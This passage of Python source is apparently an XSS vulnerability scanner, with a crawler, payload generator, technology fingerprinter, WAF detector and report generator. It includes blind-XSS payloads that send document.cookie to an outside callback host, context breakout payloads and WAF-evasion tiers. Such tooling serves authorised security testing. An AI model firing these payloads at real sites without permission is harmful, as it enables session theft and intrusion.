            'type': 'dns',  # or http, https, smtp
            'server': None,  # Would be set to actual server
            'poll_interval': 5,
            'timeout': 60
        }

        return collaborator_config

    def generate_collaborator_payload(self, collaborator_url: str) -> str:
        """Generate payload with collaborator callback"""
        if not collaborator_url:
            return "<script>alert('XSS')</script>"

        # Generate unique identifier
        unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        # Create payload that calls back to collaborator
        payloads = [
            f"<script>fetch('http://{collaborator_url}/{unique_id}?c='+document.cookie)</script>",
            f"<img src=x onerror=\"new Image().src='http://{collaborator_url}/{unique_id}?d='+document.domain\">",
            f"<script>navigator.sendBeacon('http://{collaborator_url}/{unique_id}', document.cookie)</script>",
            f"<link rel='ping' href='http://{collaborator_url}/{unique_id}'>"
        ]

        return payloads[0]  # Return first payload


# ============================================================================
# PAYLOAD GENERATOR
# ============================================================================

class XSSPayloadGenerator:
    """Advanced XSS payload generator"""

    def __init__(self):
        self.payloads = XSSPayloads()
        self.context_aware = True
        self.evasion_level = 2  # 0: basic, 1: moderate, 2: advanced

    def get_reflected_payloads(self) -> List[str]:
        """Get payloads for reflected XSS testing"""
        payloads = []

        # Add basic payloads
        payloads.extend(self.payloads.BASIC)

        # Add evasion payloads based on level
        if self.evasion_level >= 1:
            payloads.extend(self.payloads.EVASION[:10])

        if self.evasion_level >= 2:
            payloads.extend(self.payloads.WAF_BYPASS[:10])
            payloads.extend(self.payloads.POLYGLOT[:5])

        return payloads

    def get_dom_payloads(self) -> List[str]:
        """Get payloads for DOM XSS testing"""
        payloads = []
        payloads.extend(self.payloads.DOM)
        payloads.extend(self.payloads.POLYGLOT[:3])
        return payloads

    def get_stored_payloads(self) -> List[str]:
        """Get payloads for stored XSS testing"""
        payloads = []
        payloads.extend(self.payloads.BASIC)
        payloads.extend(self.payloads.BLIND[:5])
        return payloads

    def get_blind_payloads(self) -> List[str]:
        """Get payloads for blind XSS testing"""
        return self.payloads.BLIND

    def generate_context_aware_payload(self, context: str) -> List[str]:
        """Generate payloads based on context (HTML attribute, script, etc.)"""
        if context == 'html':
            return [
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
            ]
        elif context == 'attribute':
            return [
                '" onmouseover=alert(1) x="',
                "' onfocus=alert(1) autofocus '",
                '` onload=alert(1) `'
            ]
        elif context == 'script':
            return [
                '</script><script>alert(1)</script>',
                '\\";alert(1);//',
                "';alert(1);//"
            ]
        elif context == 'url':
            return [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'javascript:eval(atob("YWxlcnQoMSk="))'
            ]
        else:
            return self.get_reflected_payloads()


# ============================================================================
# TECHNOLOGY FINGERPRINTER
# ============================================================================

class TechnologyFingerprinter:
    """Fingerprint web technologies"""

    def __init__(self):
        self.tech_signatures = {
            'JavaScript Frameworks': {
                'React': [r'react\.js', r'ReactDOM', r'__reactInternalInstance'],
                'Angular': [r'ng-', r'angular\.js', r'data-ng-'],
                'Vue': [r'vue\.js', r'__vue__', r'v-'],
                'jQuery': [r'jquery\.js', r'\$\.', r'jQuery\.'],
                'Backbone': [r'Backbone\.js'],
                'Ember': [r'ember\.js'],
            },
            'Server Technologies': {
                'PHP': [r'X-Powered-By: PHP', r'\.php\?'],
                'ASP.NET': [r'X-Powered-By: ASP\.NET', r'\.aspx\?'],
                'Node.js': [r'X-Powered-By: Express', r'connect\.sid'],
                'Python': [r'X-Powered-By: Python', r'WSGI'],
                'Java': [r'X-Powered-By: JSP', r'JSESSIONID'],
                'Ruby': [r'X-Powered-By: Ruby', r'rails', r'_session_id'],
            },
            'Security Headers': {
                'CSP': [r'Content-Security-Policy'],
                'HSTS': [r'Strict-Transport-Security'],
                'X-Frame-Options': [r'X-Frame-Options'],
                'X-XSS-Protection': [r'X-XSS-Protection'],
                'X-Content-Type-Options': [r'X-Content-Type-Options'],
            }
        }

    def fingerprint(self, url: str, http_client: AdvancedHTTPClient) -> Dict[str, List[str]]:
        """Fingerprint technologies on target"""
        tech_found = defaultdict(list)

        try:
            response = http_client.get(url)

            # Check headers
            for header, value in response.headers.items():
                for tech_type, signatures in self.tech_signatures.items():
                    for tech, patterns in signatures.items():
                        for pattern in patterns:
                            if re.search(pattern, f"{header}: {value}", re.IGNORECASE):
                                tech_found[tech_type].append(tech)

            # Check HTML content
            html_content = response.text[:5000]  # First 5KB
            for tech_type, signatures in self.tech_signatures.items():
                for tech, patterns in signatures.items():
                    for pattern in patterns:
                        if re.search(pattern, html_content, re.IGNORECASE):
                            if tech not in tech_found[tech_type]:
                                tech_found[tech_type].append(tech)

            # Check URL patterns
            parsed = urlparse(url)
            if '.php' in parsed.path:
                tech_found['Server Technologies'].append('PHP')
            elif '.aspx' in parsed.path:
                tech_found['Server Technologies'].append('ASP.NET')
            elif '.jsp' in parsed.path:
                tech_found['Server Technologies'].append('Java')

        except Exception as e:
            logging.debug(f"Fingerprinting failed: {e}")

        return dict(tech_found)


# ============================================================================
# WAF DETECTOR
# ============================================================================

class WAFDetector:
    """Detect Web Application Firewalls"""

    def __init__(self):
        self.waf_signatures = {
            'Cloudflare': [r'cf-ray', r'__cfduid', r'cloudflare'],
            'Akamai': [r'akamai', r'X-Akamai'],
            'Imperva': [r'incap_ses', r'visid_incap'],
            'AWS WAF': [r'AWS', r'X-Amz-Cf-Id'],
            'ModSecurity': [r'mod_security', r'libmodsecurity'],
            'FortiWeb': [r'FORTIWAFSID'],
            'Barracuda': [r'barracuda'],
        }

    def detect(self, url: str, http_client: AdvancedHTTPClient) -> Dict[str, Any]:
        """Detect WAF presence"""
        result = {'detected': False, 'type': None, 'confidence': 0.0}

        try:
            # Make a request with suspicious payload
            test_payload = "<script>alert(1)</script>"
            test_url = f"{url}?test={test_payload}"

            response = http_client.get(test_url)

            # Check headers for WAF signatures
            for waf_type, signatures in self.waf_signatures.items():
                for sig in signatures:
                    for header, value in response.headers.items():
                        if re.search(sig, f"{header}: {value}", re.IGNORECASE):
                            result['detected'] = True
                            result['type'] = waf_type
                            result['confidence'] = 0.8
                            return result

            # Check response body for WAF blocks
            waf_blocks = [
                r'blocked',
                r'security',
                r'forbidden',
                r'not acceptable',
                r'access denied',
                r'cloudflare'
            ]

            for block_pattern in waf_blocks:
                if re.search(block_pattern, response.text, re.IGNORECASE):
                    result['detected'] = True
                    result['type'] = 'Generic'
                    result['confidence'] = 0.6
                    break

        except Exception as e:
            logging.debug(f"WAF detection failed: {e}")

        return result


# ============================================================================
# MAIN SCANNER CLASS
# ============================================================================

class AdvancedXSSScanner:
    """Main scanner class orchestrating all components"""

    def __init__(self, config: ScannerConfig = None):
        self.config = config or ScannerConfig()
        self.http_client = AdvancedHTTPClient(self.config)
        self.crawler = WebCrawler(self.http_client, self.config)
        self.detection_engine = XSSDetectionEngine(self.config)
        self.results = ScanResult(
            scan_id=self.generate_scan_id(),
            target_url="",
            start_time=datetime.now().isoformat()
        )

        # Setup logging
        self.setup_logging()

    def generate_scan_id(self) -> str:
        """Generate unique scan ID"""
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_str = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
        return f"xssscan_{timestamp}_{random_str}"

    def setup_logging(self):
        """Setup logging configuration"""
        log_level = logging.DEBUG if self.config.debug else logging.INFO
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f"{self.results.scan_id}.log"),
                logging.StreamHandler()
            ]
        )

    def scan(self, target_url: str) -> ScanResult:
        """Main scan method"""
        logging.info(f"Starting XSS scan for: {target_url}")

        self.results.target_url = target_url

        try:
            # Phase 1: Crawling and discovery
            logging.info("Phase 1: Crawling target...")
            pages = self.crawler.crawl(target_url)
            self.results.pages = pages
            self.results.pages_scanned = len(pages)

            # Phase 2: Vulnerability detection
            logging.info("Phase 2: Testing for XSS vulnerabilities...")
            vulnerabilities = []

            with ThreadPoolExecutor(max_workers=self.config.max_concurrent) as executor:
                future_to_url = {
                    executor.submit(self.detection_engine.analyze_url, page.url, self.http_client): page.url
                    for page in pages[:self.config.max_pages]
                }

                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        page_vulns = future.result()
                        vulnerabilities.extend(page_vulns)
                        logging.info(f"Found {len(page_vulns)} vulnerabilities on {url}")
                    except Exception as e:
                        logging.error(f"Error scanning {url}: {e}")

            #self.results.vulnerabilities = self.deduplicate_vulnerabilities(vulnerabilities)
            #self.results.vulnerabilities = self.smart_deduplicate(vulnerabilities)

            self.results.vulnerabilities = self.deduplicate_vulnerabilities_advanced(vulnerabilities)
            self.results.vulnerabilities_found = len(self.results.vulnerabilities)

            #old
            #self.results.vulnerabilities = vulnerabilities
            #self.results.vulnerabilities_found = len(vulnerabilities)

            # Phase 3: Technology fingerprinting
            logging.info("Phase 3: Fingerprinting technologies...")
            fingerprinter = TechnologyFingerprinter()
            waf_detector = WAFDetector()

            tech_info = fingerprinter.fingerprint(target_url, self.http_client)
            waf_info = waf_detector.detect(target_url, self.http_client)

            self.results.tech_stack = tech_info.get('Server Technologies', []) + \
                                      tech_info.get('JavaScript Frameworks', [])
            self.results.waf_detected = waf_info['detected']
            self.results.waf_type = waf_info['type']

            # Calculate statistics
            self.calculate_statistics()

            # End scan
            self.results.end_time = datetime.now().isoformat()
            self.results.duration = (
                    datetime.fromisoformat(self.results.end_time) -
                    datetime.fromisoformat(self.results.start_time)
            ).total_seconds()

            logging.info(f"Scan completed. Found {len(vulnerabilities)} vulnerabilities.")

        except Exception as e:
            logging.error(f"Scan failed: {e}")
            raise

        return self.results

    def deduplicate_vulnerabilities(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Remove duplicate vulnerabilities"""
        unique_vulns = {}

        for vuln in vulnerabilities:
            # Create a unique key: url + parameter + payload hash
            key = f"{vuln.url}:{vuln.parameter}:{hashlib.md5(vuln.payload.encode()).hexdigest()[:8]}"

            if key not in unique_vulns:
                unique_vulns[key] = vuln
            else:
                # Keep the one with higher confidence
                if vuln.confidence > unique_vulns[key].confidence:
                    unique_vulns[key] = vuln

        return list(unique_vulns.values())

    def deduplicate_vulnerabilities_advanced(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Advanced deduplication considering context and severity"""
        # Group by URL + parameter
        grouped = {}

        for vuln in vulnerabilities:
            # Create grouping key
            key = f"{vuln.url}:{vuln.parameter}"

            if key not in grouped:
                grouped[key] = []
            grouped[key].append(vuln)

        unique_vulns = []

        for key, vuln_list in grouped.items():
            # Sort by confidence (highest first)
            vuln_list.sort(key=lambda x: x.confidence, reverse=True)

            # Take the highest confidence one
            best_vuln = vuln_list[0]

            # Add context about variations found
            if len(vuln_list) > 1:
                payload_variations = list(set([v.payload[:50] for v in vuln_list]))
                best_vuln.context['variations_found'] = len(vuln_list)
                best_vuln.context['payload_samples'] = payload_variations[:3]  # First 3

            unique_vulns.append(best_vuln)

        return unique_vulns

    def smart_deduplicate(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Smart deduplication with multiple strategies"""
        if not vulnerabilities:
            return []

        # Strategy 1: Remove exact duplicates
        exact_unique = self._remove_exact_duplicates(vulnerabilities)

        # Strategy 2: Remove similar payloads on same parameter
        context_unique = self._remove_context_duplicates(exact_unique)

        # Strategy 3: Keep only highest severity per attack vector
        final_vulns = self._keep_best_per_vector(context_unique)

        return final_vulns

    def _remove_exact_duplicates(self, vulns: List[Vulnerability]) -> List[Vulnerability]:
        """Remove exact duplicates (same URL + exact same payload)"""
        seen = set()
        unique = []

        for vuln in vulns:
            key = f"{vuln.url}:{vuln.parameter}:{vuln.payload}"
            if key not in seen:
                seen.add(key)
                unique.append(vuln)

        return unique

    def _remove_context_duplicates(self, vulns: List[Vulnerability]) -> List[Vulnerability]:
        """Remove duplicates in same context"""
        grouped = defaultdict(list)

        for vuln in vulns:
            # Group by URL + parameter + payload type
            payload_type = self._classify_payload_type(vuln.payload)
            group_key = f"{vuln.url}:{vuln.parameter}:{payload_type}"
            grouped[group_key].append(vuln)

        result = []
        for group_key, vuln_list in grouped.items():
            # Sort by confidence and severity
            vuln_list.sort(key=lambda x: (
                -x.confidence,  # Higher confidence first
                -self._severity_value(x.severity)  # Higher severity first
            ))
            result.append(vuln_list[0])

        return result

    def _classify_payload_type(self, payload: str) -> str:
        """Classify payload by type"""
        payload_lower = payload.lower()

        if '<script>' in payload_lower:
            return 'script_tag'
        elif 'onerror=' in payload_lower or 'onload=' in payload_lower:
            return 'event_handler'
        elif 'javascript:' in payload_lower:
            return 'javascript_url'
        elif 'data:' in payload_lower:
            return 'data_url'
        elif '<svg' in payload_lower:
            return 'svg_tag'
        elif '<img' in payload_lower:
            return 'img_tag'
        elif '<iframe' in payload_lower:
            return 'iframe_tag'
        elif 'innerhtml' in payload_lower or 'document.write' in payload_lower:
            return 'dom_manipulation'
        elif 'eval(' in payload_lower or 'function(' in payload_lower:
            return 'js_execution'
        else:
            return 'other'

    def _severity_value(self, severity: str) -> int:
        """Convert severity to numeric value"""
        severity_map = {
            'critical': 4,
            'high': 3,
            'medium': 2,
            'low': 1,
            'info': 0
        }
        return severity_map.get(severity.lower(), 0)

    def _keep_best_per_vector(self, vulns: List[Vulnerability]) -> List[Vulnerability]:
        """Keep best finding per attack vector"""
        # Group by attack vector
        vectors = defaultdict(list)

        for vuln in vulns:
            vector = self._determine_attack_vector(vuln)
            vectors[vector].append(vuln)

        result = []
        for vector, vuln_list in vectors.items():
            # Get the most severe
            vuln_list.sort(key=lambda x: (
                -self._severity_value(x.severity),
                -x.confidence
            ))
            result.append(vuln_list[0])

        return result

    def _determine_attack_vector(self, vuln: Vulnerability) -> str:
        """Determine the attack vector"""
        if vuln.type == 'dom':
            return f"dom_{vuln.parameter}"
        elif vuln.type == 'stored':
            return f"stored_{vuln.parameter}"
        else:  # reflected
            return f"reflected_{vuln.parameter}"

    def calculate_statistics(self):
        """Calculate scan statistics"""
        stats = {
            'total_pages': len(self.results.pages),
            'total_forms': sum(len(page.forms) for page in self.results.pages),
            'total_inputs': sum(len(page.inputs) for page in self.results.pages),
            'vulnerabilities_by_type': defaultdict(int),
            'vulnerabilities_by_severity': defaultdict(int),
            'vulnerabilities_by_confidence': {
                'high': 0,
                'medium': 0,
                'low': 0
            }
        }

        for vuln in self.results.vulnerabilities:
            stats['vulnerabilities_by_type'][vuln.type] += 1
            stats['vulnerabilities_by_severity'][vuln.severity] += 1

            if vuln.confidence >= 0.8:
                stats['vulnerabilities_by_confidence']['high'] += 1
            elif vuln.confidence >= 0.5:
                stats['vulnerabilities_by_confidence']['medium'] += 1
            else:
                stats['vulnerabilities_by_confidence']['low'] += 1

        self.results.statistics = stats


# ============================================================================
# REPORT GENERATOR
# ============================================================================

class ReportGenerator:
    """Generate detailed reports"""

    @staticmethod
    def generate_json_report(scan_result: ScanResult, output_file: str):
        """Generate JSON report"""
        report_data = {
            'metadata': {
                'scan_id': scan_result.scan_id,
                'target': scan_result.target_url,
                'start_time': scan_result.start_time,
                'end_time': scan_result.end_time,
                'duration': scan_result.duration,
                'scanner_version': '1.0.0'
            },
            'summary': {
                'pages_scanned': scan_result.pages_scanned,
                'vulnerabilities_found': scan_result.vulnerabilities_found,
                'waf_detected': scan_result.waf_detected,
                'waf_type': scan_result.waf_type,
                'technologies': scan_result.tech_stack
            },
            'statistics': scan_result.statistics,
            'vulnerabilities': [vuln.to_dict() for vuln in scan_result.vulnerabilities],
            'pages': [asdict(page) for page in scan_result.pages[:10]],  # First 10 pages
            'config': scan_result.config
        }

        with open(output_file, 'w') as f:
            json.dump(report_data, f, indent=2, default=str)

        print(f"JSON report saved to: {output_file}")
        return output_file

    @staticmethod
    def generate_html_report(scan_result: ScanResult, output_file: str):
        """Generate HTML report"""
        template = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>XSS Scan Report - {scan_id}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
                .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }}
                .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px 10px 0 0; margin: -30px -30px 30px -30px; }}
                h1 {{ margin: 0; font-size: 28px; }}
                .summary-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }}
                .summary-card {{ background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; border-left: 4px solid #667eea; }}
                .summary-card.critical {{ border-color: #dc3545; }}
                .summary-card.high {{ border-color: #fd7e14; }}
                .summary-card.medium {{ border-color: #ffc107; }}
                .summary-card.low {{ border-color: #28a745; }}
                .vuln-card {{ border: 1px solid #ddd; margin: 15px 0; padding: 20px; border-radius: 8px; }}
                .vuln-card.critical {{ background: #f8d7da; border-color: #f5c6cb; }}
                .vuln-card.high {{ background: #fff3cd; border-color: #ffeaa7; }}
                .vuln-card.medium {{ background: #d1ecf1; border-color: #bee5eb; }}
                .vuln-card.low {{ background: #d4edda; border-color: #c3e6cb; }}
                .badge {{ display: inline-block; padding: 5px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }}
                .badge.critical {{ background: #dc3545; color: white; }}
                .badge.high {{ background: #fd7e14; color: white; }}
                .badge.medium {{ background: #ffc107; color: black; }}
                .badge.low {{ background: #28a745; color: white; }}
                pre {{ background: #2b2b2b; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; }}
                code {{ font-family: 'Courier New', monospace; }}
                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
                th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
                th {{ background: #f8f9fa; font-weight: bold; }}
                .tech-tag {{ display: inline-block; background: #e9ecef; padding: 5px 10px; margin: 2px; border-radius: 3px; font-size: 12px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🚨 XSS Vulnerability Scan Report</h1>
                    <p>Scan ID: {scan_id} | Target: {target_url}</p>
                    <p>Scan Duration: {duration:.2f} seconds | {vuln_count} vulnerabilities found</p>
                </div>

                <h2>📊 Summary</h2>
                <div class="summary-grid">
                    <div class="summary-card">
                        <h3>Pages Scanned</h3>
                        <p style="font-size: 24px; font-weight: bold;">{pages_scanned}</p>
                    </div>
                    <div class="summary-card">
                        <h3>Total Vulnerabilities</h3>
                        <p style="font-size: 24px; font-weight: bold;">{vuln_count}</p>
                    </div>
                    <div class="summary-card critical">
                        <h3>Critical</h3>
                        <p style="font-size: 24px; font-weight: bold;">{critical_count}</p>
                    </div>
                    <div class="summary-card high">
                        <h3>High</h3>
                        <p style="font-size: 24px; font-weight: bold;">{high_count}</p>
                    </div>
                </div>

                <h2>🔧 Technologies Detected</h2>
                <div>
                    {tech_tags}
                </div>

                <h2>🛡️ WAF Detection</h2>
                <p>{waf_status}</p>

                <h2>📋 Vulnerability Details</h2>
                {vulnerabilities_html}

                <h2>📈 Statistics</h2>
                <table>
                    <tr>
                        <th>Vulnerability Type</th>
                        <th>Count</th>
                    </tr>
                    {stats_rows}
                </table>

                <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 12px; color: #666;">
                    <p>Report generated by Advanced XSS Scanner v1.0.0</p>
                    <p>Scan completed: {end_time}</p>
                </div>
            </div>
        </body>
        </html>
        """

        # Calculate counts
        critical_count = sum(1 for v in scan_result.vulnerabilities if v.severity == 'critical')
        high_count = sum(1 for v in scan_result.vulnerabilities if v.severity == 'high')

        # Technology tags
        tech_tags = ""
        for tech in scan_result.tech_stack:
            tech_tags += f'<span class="tech-tag">{tech}</span>\n'

        # WAF status
        waf_status = f"✅ No WAF detected" if not scan_result.waf_detected else f"⚠️ WAF detected: {scan_result.waf_type}"

        # Vulnerabilities HTML
        vulnerabilities_html = ""
        for vuln in scan_result.vulnerabilities:
            vuln_class = vuln.severity.lower()
            vulnerabilities_html += f"""
            <div class="vuln-card {vuln_class}">
                <h3>
                    <span class="badge {vuln_class}">{vuln.severity.upper()}</span>
                    {html.escape(vuln.type.title())} XSS - {html.escape(vuln.url)}
                </h3>
                <p><strong>Parameter:</strong> {html.escape(vuln.parameter or 'N/A')}</p>
                <p><strong>Payload:</strong> <code>{html.escape(vuln.payload or 'N/A')}</code></p>
                <p><strong>Evidence:</strong> {html.escape(vuln.evidence or 'N/A')}</p>
                <p><strong>Confidence:</strong> {vuln.confidence * 100:.1f}%</p>
                <details>
                    <summary>Show Details</summary>
                    <pre>URL: {html.escape(vuln.url)}
Method: {vuln.method}
Location: {vuln.location or 'N/A'}
CWE: {', '.join(vuln.cwe)}</pre>
                </details>
            </div>
            """

        # Statistics rows
        stats_rows = ""
        for vuln_type, count in scan_result.statistics.get('vulnerabilities_by_type', {}).items():
            stats_rows += f"<tr><td>{vuln_type}</td><td>{count}</td></tr>\n"

        # Fill template
        html_content = template.format(
            scan_id=scan_result.scan_id,
            target_url=scan_result.target_url,
            duration=scan_result.duration,
            vuln_count=scan_result.vulnerabilities_found,
            pages_scanned=scan_result.pages_scanned,
            critical_count=critical_count,
            high_count=high_count,
            tech_tags=tech_tags,
            waf_status=waf_status,
            vulnerabilities_html=vulnerabilities_html,
            stats_rows=stats_rows,
            end_time=scan_result.end_time
        )

        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)

        print(f"HTML report saved to: {output_file}")
        return output_file


# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Advanced XSS Scanner - Complete URL-based XSS detection tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://example.com
  %(prog)s https://example.com --output report.json
  %(prog)s https://example.com --depth 5 --concurrent 20
  %(prog)s https://example.com --no-selenium --quick
        """
    )

    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("--output", "-o", help="Output file for report")
    parser.add_argument("--format", "-f", choices=["json", "html", "both"],
                        default="json", help="Output format")
    parser.add_argument("--depth", "-d", type=int, default=3, help="Crawl depth")
    parser.add_argument("--pages", "-p", type=int, default=50, help="Maximum pages to scan")
    parser.add_argument("--concurrent", "-c", type=int, default=10, help="Concurrent requests")
    parser.add_argument("--timeout", "-t", type=int, default=30, help="Request timeout")
    parser.add_argument("--payloads", type=int, default=50, help="Payloads per test")
    parser.add_argument("--quick", action="store_true", help="Quick scan mode")
    parser.add_argument("--full", action="store_true", help="Full scan mode")
    parser.add_argument("--no-selenium", action="store_true", help="Disable Selenium for DOM XSS")
    parser.add_argument("--proxy", help="Use proxy (http://proxy:port)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--debug", action="store_true", help="Debug mode")

    args = parser.parse_args()

    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        print("Error: URL must start with http:// or https://")
        sys.exit(1)

    # Configure scanner
    config = ScannerConfig()
    config.max_depth = args.depth
    config.max_pages = args.pages
    config.max_concurrent = args.concurrent
    config.timeout = args.timeout
    config.payload_count = args.payloads
    config.use_selenium = not args.no_selenium
    config.use_proxy = args.proxy
    config.verbose = args.verbose
    config.debug = args.debug

    if args.depth == 0:
        # When depth is 0, only scan the provided URL
        config.max_pages = 1  # Only scan the initial page

    # Adjust for quick/full mode
    if args.quick:
        config.max_pages = 10
        config.payload_count = 20
        config.scan_types = ['reflected', 'dom']

    if args.full:
        config.max_pages = 100
        config.payload_count = 100
        config.scan_types = ['reflected', 'stored', 'dom', 'blind']

    # Check dependencies
    check_dependencies()

    try:
        # Create and run scanner
        scanner = AdvancedXSSScanner(config)
        results = scanner.scan(args.url)

        # Generate reports
        if args.format in ["json", "both"]:
            if args.output:
                # User provided output name
                if '.' in args.output:
                    # Has extension
                    if args.output.endswith('.json'):
                        json_output = args.output
                    elif args.output.endswith('.html'):
                        json_output = args.output.replace('.html', '.json')
                    else:
                        # Some other extension, replace with .json
                        json_output = os.path.splitext(args.output)[0] + '.json'
                else:
                    # No extension provided
                    if args.format == "both":
                        json_output = args.output + ".json"
                    else:
                        json_output = args.output if args.output.endswith('.json') else args.output + '.json'
            else:
                # Auto-generate
                json_output = f"xss_report_{results.scan_id}.json"

            ReportGenerator.generate_json_report(results, json_output)

        if args.format in ["html", "both"]:
            if args.output:
                # User provided output name
                if '.' in args.output:
                    # Has extension
                    if args.output.endswith('.html'):
                        html_output = args.output
                    elif args.output.endswith('.json'):
                        html_output = args.output.replace('.json', '.html')
                    else:
                        # Some other extension, replace with .html
                        html_output = os.path.splitext(args.output)[0] + '.html'
                else:
                    # No extension provided
                    if args.format == "both":
                        html_output = args.output + ".html"
                    else:
                        html_output = args.output if args.output.endswith('.html') else args.output + '.html'
            else:
                # Auto-generate
                html_output = f"xss_report_{results.scan_id}.html"

            ReportGenerator.generate_html_report(results, html_output)


        # Print summary
        print("\n" + "=" * 80)
        print("SCAN COMPLETED".center(80))
        print("=" * 80)
        print(f"Target: {results.target_url}")
        print(f"Pages scanned: {results.pages_scanned}")
        print(f"Vulnerabilities found: {results.vulnerabilities_found}")
        print(f"Scan ID: {results.scan_id}")
        print(f"Duration: {results.duration:.2f} seconds")
        print("=" * 80)

        # Exit with appropriate code
        if results.vulnerabilities_found > 0:
            print("⚠️  Vulnerabilities detected!")
            sys.exit(1)
        else:
            print("✅ No vulnerabilities found!")
            sys.exit(0)

    except KeyboardInterrupt:
        print("\n\nScan interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"Error: {e}")
        if args.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)


def check_dependencies():
    """Check for required dependencies"""
    missing = []

    if not REQUESTS_AVAILABLE:
        missing.append("requests")

    if not BS4_AVAILABLE:
        missing.append("beautifulsoup4")

    if missing:
        print("Missing dependencies. Install with:")
        print(f"pip install {' '.join(missing)}")
        print("\nOptional dependencies for advanced features:")
        print("  pip install selenium aiohttp js2py lxml")
        sys.exit(1)


# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    main()



#=================================
#  Usage
# python xss_scanner.py http://127.0.0.1/xs.php \
#   --full \
#   --format both \
#   --depth 4 \
#   --pages 100 \
#   --concurrent 8 \
#   --payloads 50 \
#   --output xs_vulnerability_report \
#   --verbose
#========================




# --depth 0 (only for defined URL )